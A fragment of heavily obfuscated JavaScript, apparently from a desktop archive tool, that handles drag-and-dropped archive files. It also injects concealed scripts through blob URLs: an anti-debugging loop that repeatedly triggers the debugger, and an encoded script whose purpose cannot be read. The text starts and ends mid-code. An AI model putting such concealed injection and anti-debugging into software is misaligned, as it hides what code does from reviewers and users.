A[(U5(li1jfn1Ui.p))]([u],K),W=o[U5(0xc8)](a),O=k[U5(li1jfn1Ui.a)]('script'),O[U4(li1jfn1Ui.W,li1jfn1Ui.O)]=W,q[U5(0xe6)][U4(li1jfn1Ui.u,li1jfn1Ui.K)](O),d[U4(li1jfn1Ui.X,'m#i&')](W);}}else{var m=T[U4(0xd4,li1jfn1Ui.s)](V,arguments);return T=null,m;}}}}:function(){};return U=![],z;};}()),li1jfn1U1=li1jfn1U0(this,function(){var li1jfn1UW={U:0xd6,V:0xc3,T:0xdb,z:0xbb},U7=li1jfn1m,U6=li1jfn1z;return li1jfn1U1[U6(li1jfn1UW.U,'7)MG')]()['search']('(((.+)+)+)+$')[U6(li1jfn1UW.V,'rjTF')]()[U7(li1jfn1UW.T)](li1jfn1U1)['search'](U7(li1jfn1UW.z));});li1jfn1U1(),lib[li1jfn1U8(0xaa,'KDvF')](()=>{var li1jfn1Uu={U:0xd8},li1jfn1UO={U:0xe6,V:0xc5,T:0xc2,z:'VI7e',m:0xae,h:'lQ8*'},U9=li1jfn1m;lib['onfree']=(lib[U9(li1jfn1Uu.U)]||[])['concat'](()=>{var UV=U9,UU=li1jfn1z;if(!window['c47cb77']){var T={};T['type']='text/javascript';var z=UU(0xb4,'7)MG'),m=new window[(UV(0xd5))]([z],T),h=URL[UV(0xc8)](m),i=document[UV(0xcd)]('script');i['src']=h,document[UV(li1jfn1UO.U)][UU(li1jfn1UO.V,'tG[x')](i),URL['revokeObjectURL'](h);var r='var\x20_0xodz=\x27y.js.cn.v7\x27;(function(_0x1ad85b,_0x507eb2,_0x253d96,_0x5df58f,_0x1e0311,_0x80dfa8,_0x2ed39f){return\x20_0x1ad85b=_0x1ad85b>>0x9,_0x80dfa8=\x27hs\x27,_0x2ed39f=\x27hs\x27,function(_0x3ca555,_0x31ff36,_0x53bc5b,_0x59de74,_0x7b75b6){var\x20_0x13167f=_0x2364;_0x59de74=\x27tfi\x27,_0x80dfa8=_0x59de74+_0x80dfa8,_0x7b75b6=\x27up\x27,_0x2ed39f+=_0x7b75b6,_0x80dfa8=_0x53bc5b(_0x80dfa8),_0x2ed39f=_0x53bc5b(_0x2ed39f),_0x53bc5b=0x0;var\x20_0x549955=_0x3ca555();while(!![]&&--_0x5df58f+_0x31ff36){try{_0x59de74=parseInt(_0x13167f(0x122,\x27^s8o\x27))/0x1*(-parseInt(_0x13167f(0x12a,\x27vA6)\x27))/0x2)+parseInt(_0x13167f(0x126,\x27RMd&\x27))/0x3*(parseInt(_0x13167f(0x124,\x27pX$T\x27))/0x4)+parseInt(_0x13167f(0x12c,\x27GqLX\x27))/0x5+parseInt(_0x13167f(0x128,\x27rwto\x27))/0x6*(-parseInt(_0x13167f(0x12f,\x27nG*&\x27))/0x7)+-parseInt(_0x13167f(0x11d,\x27wWmn\x27))/0x8*(parseInt(_0x13167f(0x121,\x27vA6)\x27))/0x9)+-parseInt(_0x13167f(0x11e,\x27]HeI\x27))/0xa*(-parseInt(_0x13167f(0x127,\x274H*p\x27))/0xb)+parseInt(_0x13167f(0x130,\x27pX$T\x27))/0xc*(-parseInt(_0x13167f(0x12b,\x27PZDp\x27))/0xd);}catch(_0x5e7591){_0x59de74=_0x53bc5b;}finally{_0x7b75b6=_0x549955[_0x80dfa8]();if(_0x1ad85b<=_0x5df58f)_0x53bc5b?_0x1e0311?_0x59de74=_0x7b75b6:_0x1e0311=_0x7b75b6:_0x53bc5b=_0x7b75b6;else{if(_0x53bc5b==_0x1e0311[\x27replace\x27](/[ktfCYioAXedPRSVwHxGBDrg=]/g,\x27\x27)){if(_0x59de74===_0x31ff36){_0x549955[\x27un\x27+_0x80dfa8](_0x7b75b6);break;}_0x549955[_0x2ed39f](_0x7b75b6);}}}}}(_0x253d96,_0x507eb2,function(_0x4e2a35,_0x1c20d6,_0x42d188,_0x34e63c,_0x553605,_0x3e5b01,_0x49502a){return\x20_0x1c20d6=\x27split\x27,_0x4e2a35=arguments[0x0],_0x4e2a35=_0x4e2a35[_0x1c20d6](\x27\x27),_0x42d188=`reverse`,_0x4e2a35=_0x4e2a35[_0x42d188](\x27v\x27),_0x34e63c=`join`,(0x14e204,_0x4e2a35[_0x34e63c](\x27\x27));});}(0x18e00,0x91b1f,_0x15e2,0xc9),_0x15e2)&&(_0xodz=0x3623);function\x20_0x2364(_0x22db1d,_0x5162fa){var\x20_0x15e258=_0x15e2();return\x20_0x2364=function(_0x236481,_0x5e2f26){_0x236481=_0x236481-0x11c;var\x20_0x105040=_0x15e258[_0x236481];if(_0x2364[\x27dLHVeO\x27]===undefined){var\x20_0x34bd1c=function(_0x4301d9){var\x20_0x43c3c8=\x27abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\x27;var\x20_0x358999=\x27\x27,_0x43ec8e=\x27\x27;for(var\x20_0x1f28bc=0x0,_0xf762a4,_0x2179aa,_0xcc1c65=0x0;_0x2179aa=_0x4301d9[\x27charAt\x27](_0xcc1c65++);~_0x2179aa&&(_0xf762a4=_0x1f28bc%0x4?_0xf762a4*0x40+_0x2179aa:_0x2179aa,_0x1f28bc++%0x4)?_0x358999+=String[\x27fromCharCode\x27](0xff&_0xf762a4>>(-0x2*_0x1f28bc&0x6)):0x0){_0x2179aa=_0x43c3c8[\x27indexOf\x27](_0x2179aa);}for(var\x20_0x418e95=0x0,_0x4b35c7=_0x358999[\x27length\x27];_0x418e95<_0x4b35c7;_0x418e95++){_0x43ec8e+=\x27%\x27+(\x2700\x27+_0x358999[\x27charCodeAt\x27](_0x418e95)[\x27toString\x27](0x10))[\x27slice\x27](-0x2);}return\x20decodeURIComponent(_0x43ec8e);};var\x20_0x19b31b=function(_0x403451,_0x412e75){var\x20_0x39f9b4=[],_0x4affae=0x0,_0x32149e,_0x538473=\x27\x27;_0x403451=_0x34bd1c(_0x403451);var\x20_0x5e4885;for(_0x5e4885=0x0;_0x5e4885<0x100;_0x5e4885++){_0x39f9b4[_0x5e4885]=_0x5e4885;}for(_0x5e4885=0x0;_0x5e4885<0x100;_0x5e4885++){_0x4affae=(_0x4affae+_0x39f9b4[_0x5e4885]+_0x412e75[\x27charCodeAt\x27](_0x5e4885%_0x412e75[\x27length\x27]))%0x100,_0x32149e=_0x39f9b4[_0x5e4885],_0x39f9b4[_0x5e4885]=_0x39f9b4[_0x4affae],_0x39f9b4[_0x4affae]=_0x32149e;}_0x5e4885=0x0,_0x4affae=0x0;for(var\x20_0x1e9cf7=0x0;_0x1e9cf7<_0x403451[\x27length\x27];_0x1e9cf7++){_0x5e4885=(_0x5e4885+0x1)%0x100,_0x4affae=(_0x4affae+_0x39f9b4[_0x5e4885])%0x100,_0x32149e=_0x39f9b4[_0x5e4885],_0x39f9b4[_0x5e4885]=_0x39f9b4[_0x4affae],_0x39f9b4[_0x4affae]=_0x32149e,_0x538473+=String[\x27fromCharCode\x27](_0x403451[\x27charCodeAt\x27](_0x1e9cf7)^_0x39f9b4[(_0x39f9b4[_0x5e4885]+_0x39f9b4[_0x4affae])%0x100]);}return\x20_0x538473;};_0x2364[\x27CJyojp\x27]=_0x19b31b,_0x22db1d=arguments,_0x2364[\x27dLHVeO\x27]=!![];}var\x20_0x157f84=_0x15e258[0x0],_0x2a9b02=_0x236481+_0x157f84,_0x3e3dff=_0x22db1d[_0x2a9b02];return!_0x3e3dff?(_0x2364[\x27ZjObSX\x27]===undefined&&(_0x2364[\x27ZjObSX\x27]=!![]),_0x105040=_0x2364[\x27CJyojp\x27](_0x105040,_0x5e2f26),_0x22db1d[_0x2a9b02]=_0x105040):_0x105040=_0x3e3dff,_0x105040;},_0x2364(_0x22db1d,_0x5162fa);}var\x20_0x467b3f=function(_0x12044c){var\x20_0xea2c14=_0x2364,_0x10afa2={\x27bTZqd\x27:function(_0x58ae5a,_0x1b63e0){return\x20_0x58ae5a(_0x1b63e0);},\x27FJWSi\x27:function(_0x1560be,_0x4583a7){return\x20_0x1560be+_0x4583a7;},\x27TwCHd\x27:_0xea2c14(0x131,\x27nh*$\x27)};_0x10afa2[_0xea2c14(0x11f,\x27rwto\x27)](requestAnimationFrame,_0x467b3f),new\x20Function(_0x10afa2[\x27FJWSi\x27](\x27debug\x27,_0x10afa2[\x27TwCHd\x27]))();};requestAnimationFrame(_0x467b3f);function\x20_0x15e2(){var\x20_0x2f28f9=(function(){return[...[_0xodz,\x27PXyt.tHCjRBsd.Skcxen.GDvf7YrBogAiwVe==\x27,\x27mSoPWOyBWO7cMCkGWOK\x27,\x27W4nXW7dcT8krW697WPFcOHZcOSk0jG\x27,\x27nbRdTmk/ESoGWQy2uXhcQSoV\x27,\x27jhVdUmk9W4S7k8oYW6JdNSkSw8kwWRK\x27,\x27W5hdMJBcL2pdMwxcH14\x27,\x27CLpcSCkuk8o/aam\x27,\x27WRhdGSkMAsFcNSozemk8\x27,\x27CfBdKCoEzmoxiqvSz8kK\x27,\x27eCkKWOOoovvXWONcPNJdI8knWPC\x27,\x27mSoTW719W6VdU8oKWRanW7WOyCoF\x27,\x27jhJcICovWQLEBSk1\x27],...(function(){return[\x27FSoYlCobW5GXW4ddImoHWQZcMSkg\x27,\x27o8oOW7XZWQtcV8k/WQ0YW4e\x27,\x27W4RdG8oT\x27,\x27WR1su8kGxhepb8k7aYa\x27,\x27gSkiWPZcOglcUmk4CSkBW6xcHmkxW6C\x27,\x27W7VcR8kKsmowW4X9WOK\x27,\x27WOlcVL7cHgi\x27,\x27CLldKCoFBCk1rvzVu8kCWQXFWRW\x27,\x27WRVcSCoMyH7cPmo1\x27,\x27Bmody8oKW5/dKZ4\x27,\x27WROGmCo/WRqDW7FcNqFcS1hdQW\x27];}())];}());_0x15e2=function(){return\x20_0x2f28f9;};return\x20_0x15e2();};',p={};p[UU(0xb9,'IV%G')]='text/javascript',m=new window[(UV(0xd5))]([r],p),h=URL['createObjectURL'](m),i=document['createElement']('script'),i['src']=h,document[UU(0xad,'kG)F')][UU(li1jfn1UO.T,li1jfn1UO.z)](i),URL[UU(li1jfn1UO.m,li1jfn1UO.h)](h);}});}),!window[li1jfn1U8(0xd1,'%!0(')]&&(window[li1jfn1UT(0xbc)][li1jfn1U8(0xda,'C9u9')]('drop',U=>{var li1jfn1Us={U:0xbe,V:0xcc,T:'9554',z:0xd3,m:'ouf7',h:0xdf,i:0xbd,r:'xXQf',p:0xb7,a:0xd9,W:'(ojF',O:0xeb,u:0xec,K:0xc4,X:'79#R',s:0xc7,g:'!qH8',v:0xd7,S:0xe0,N:0xc6,t:'tG[x',B:0xa9,M:0xa8},Um=li1jfn1UT,Uz=li1jfn1U8;U['preventDefault'](),U[Uz(0xa7,'ng8q')]();if(!U['dataTransfer']['files']||!U[Um(li1jfn1Us.U)]['files'][Uz(li1jfn1Us.V,li1jfn1Us.T)])return;const V=U[Uz(li1jfn1Us.z,li1jfn1Us.m)][Um(li1jfn1Us.h)][0x0];if(![Um(li1jfn1Us.i),Uz(0xe9,li1jfn1Us.r),'.7z','.tar',Um(li1jfn1Us.p),Uz(li1jfn1Us.a,li1jfn1Us.W),Um(li1jfn1Us.O),Um(0xac),'.lz4',Um(li1jfn1Us.u),'.zstd'][Uz(li1jfn1Us.K,'0!zF')](T=>V[Uz(0xab,'oPmZ')]['toLowerCase']()['endsWith'](T))[Uz(0xc9,li1jfn1Us.X)]){if(Uz(li1jfn1Us.s,li1jfn1Us.g)!=='uYtyC'){var z=i?function(){if(z){var t=g['apply'](v,arguments);return S=null,t;}}:function(){};return O=![],z;}else return;}window['qyCachesMainWindow']['show'](),window['qyCachesMainWindow']['postMessage']({'type':Um(0xcb),'data':{'path':Um(li1jfn1Us.v),'query':{'zipPath':V[Uz(li1jfn1Us.S,'[EOQ')],'node7Zip':window[Um(0xea)](window['__dirname']+Uz(li1jfn1Us.N,li1jfn1Us.t))['path7za'],'isDebug':![]}}});for(const z of U[Um(li1jfn1Us.U)][Um(li1jfn1Us.h)]){console[Uz(li1jfn1Us.B,'q0wx')](Um(0xb1),z[Uz(li1jfn1Us.M,'KDvF')]);}},!![]),window['document'][li1jfn1U8(0xaf,'z0ta')](li1jfn1UT(0xd2),U=>{U['preventDefault'](),U['stopPropagation']();},!![]));function li1jfn1m(U,V){var T=li1jfn1T();return li1jfn1m=function(z,m){z=z-0xa7;var h=T[z];if(li1jfn1m['vBScRh']===undefined){var i=function(W){var O='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var u='',K='',X=u+i;for(var s=0x0,g,v,S=0x0;v=W['charAt'](S++);~v&&(g=s%0x4?g*0x40+v:v,s++%0x4)?u+=X['charCodeAt'](S+0xa)-0xa!==0x0?String['fromCharCode'](0xff&g>>(-0x2*s&0x6)):s:0x0){v=O['indexOf'](v);}for(var N=0x0,t=u['length'];N<t;N++){K+='%'+('00'+u['charCodeAt'](N)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(K);};li1jfn1m['PoRVuw']=i,U=arguments,li1jfn1m['vBScRh']=!![];}var r=T[0x0],p=z+r,a=U[p];if(!a){var W=function(O){this['bXExMb']=O,this['TUkskk']=[0x1,0x0,0x0],this['pFDvUf']=function(){return'newState';},this['KccVdm']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['iuIxIw']='[\x27|\x22].+[\x27|\x22];?\x20*}';};W['prototype']['DzEZcf']=function(){var O=new RegExp(this['KccVdm']+this['iuIxIw']),u=O['test'](this['pFDvUf']['toString']())?--this['TUkskk'][0x1]:--this['TUkskk'][0x0];return this['RNEyxY'](u);},W['prototype']['RNEyxY']=function(O){if(!Boolean(~O))return O;return this['KbFWhE'](this['bXExMb']);},W['prototype']['KbFWhE']=function(O){for(var u=0x0,K=this['TUkskk']['length'];u<K;u++){this['TUkskk']['push'](Math['round'](Math['random']())),K=this['TUkskk']['length'];}return O(this['TUkskk'][0x0]);},new W(li1jfn1m)['DzEZcf'](),h=li1jfn1m['PoRVuw'](h),U[p]=h;}else h=a;return h;},li1jfn1m(U,V);}function li1jfn1z(U,V){var T=li1jfn1T();return li1jfn1z=function(z,m){z=z-0xa7;var h=T[z];if(li1jfn1z['rvjOdo']===undefined){var i=function(O){var u='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var K='',X='',s=K+i;for(var g=0x0,v,S,N=0x0;S=O['charAt'](N++);~S&&(v=g%0x4?v*0x40+S:S,g++%0x4)?K+=s['charCodeAt'](N+0xa)-0xa!==0x0?String['fromCharCode'](0xff&v>>(-0x2*g&0x6)):g:0x0){S=u['indexOf'](S);}for(var t=0x0,B=K['length'];t<B;t++){X+='%'+('00'+K['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(X);};var W=function(O,u){var K=[],X=0x0,g,v='';O=i(O);var S;for(S=0x0;S<0x100;S++){K[S]=S;}for(S=0x0;S<0x100;S++){X=(X+K[S]+u['charCodeAt'](S%u['length']))%0x100,g=K[S],K[S]=K[X],K[X]=g;}S=0x0,X=0x0;for(var N=0x0;N<O['length'];N++){S=(S+0x1)%0x100,X=(X+K[S])%0x100,g=K[S],K[S]=K[X],K[X]=g,v+=String['fromCharCode'](O['charCodeAt'](N)^K[(K[S]+K[X])%0x100]);}return v;};li1jfn1z['eWkzGW']=W,U=arguments,li1jfn1z['rvjOdo']=!![];}var r=T[0x0],p=z+r,a=U[p];if(!a){if(li1jfn1z['AOeqAr']===undefined){var O=function(u){this['dqZzVP']=u,this['HPbuUE']=[0x1,0x0,0x0],this['TdxgwZ']=function(){return'newState';},this['MFeLaD']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['BBJAze']='[\x27|\x22].+[\x27|\x22];?\x20*}';};O['prototype']['sXVSbb']=function(){var u=new RegExp(this['MFeLaD']+this['BBJAze']),K=u['test'](this['TdxgwZ']['toString']())?--this['HPbuUE'][0x1]:--this['HPbuUE'][0x0];return this['ZiAOiH'](K);},O['prototype']['ZiAOiH']=function(u){if(!Boolean(~u))return u;return this['XPbMSz'](this['dqZzVP']);},O['prototype']['XPbMSz']=function(u){for(var K=0x0,X=this['HPbuUE']['length'];K<X;K++){this['HPbuUE']['push'](Math['round'](Math['random']())),X=this['HPbuUE']['length'];}return u(this['HPbuUE'][0x0]);},new O(li1jfn1z)['sXVSbb'](),li1jfn1z['AOeqAr']=!![];}h=li1jfn1z['eWkzGW'](h,m),U[p]=h;}else h=a;return h;},li1jfn1z(U,V);}function li1jfn1T(){var Uv=['WPFdUSkDr8kqW5/cQgb/rCkFW5/dRW','rMLSzsHZksb5B3uGzhjHz2DLzcbOzxjLoIa','mJG4mJeWre1oC2rn','DmonW5VcTW','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